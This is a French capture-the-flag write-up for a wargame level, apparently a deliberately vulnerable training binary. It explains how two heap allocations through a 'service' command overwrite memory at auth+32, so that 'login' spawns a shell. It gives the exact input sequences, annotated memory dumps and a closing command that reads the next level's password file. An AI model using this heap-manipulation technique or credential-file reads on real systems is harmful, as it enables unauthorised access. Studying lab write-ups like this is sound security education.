# level8 - Heap Memory Manipulation

## Analyse du Programme

**Structure**
- Boucle principale avec `fgets(buf, 128, stdin)`
- Commandes disponibles: `auth`, `reset`, `service`, `login`
- Vérification critique: `auth[32] != 0` pour `login`

**Comportement Mémoire**
- `auth`: alloue 4 bytes à `0x804a008`
- `service`: utilise `strdup` sur `buf+7`
- Chaque allocation décale de 16 bytes
- Headers malloc entre les blocs

## Exploitation

**Étapes**
1. `auth`: initialise le pointeur auth
2. Premier `serviceAAAA`: écrit à `0x804a018`
3. Second `serviceAAAA`: écrit à `0x804a028`
4. `login`: vérifie `auth` qui pointe maintenant vers nos "AAAA"

**Memory**

```nasm
0x804a008:      0x0000000a(auth)      0x00000000      0x00000000      0x00000011
0x804a018:      0x41414141(AAAA)      0x0000000a      0x00000000      0x00000011
0x804a028:      0x41414141(AAAA)      0x0000000a      0x00000000      0x00020fd1
                        |
                        |
          auth+32 <-----+
```

**Séquence d'Exploitation**
```bash
auth 
serviceAAAA
serviceAAAA
login
```

Cette exploitation fonctionne car:
- Le second bloc "AAAA" est placé à `auth + 32`
- La condition `auth != 0` devient vraie
- Le programme exécute `system("/bin/sh")`

**Solution supplementaire**
```
auth aaaa                   // Les 'a' sont presents a but illustratif
servicebbbbbbbbbbbbbbbb     // 16 * 'b'
login
```

Apercu de la memoire:
```
0x804a008:      0x61616161      0x0000000a      0x00000000      0x00000019
0x804a018:      0x62626262      0x62626262      0x62626262      0x62626262
0x804a028:      0x0000000a      0x00020fd9      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
```

Sachant que `auth` fait un `malloc` de 4 qui sera aligne a 16 (1ere ligne) et que la prochaine allocation se fera a la suite (2eme ligne), nous en deduisons que 16 octets suffiront pour atteindre auth[32], ainsi, la condition `auth[32] != 0` sera vraie.

**Obtention du Flag**
```bash
cat /home/user/level9/.pass
```
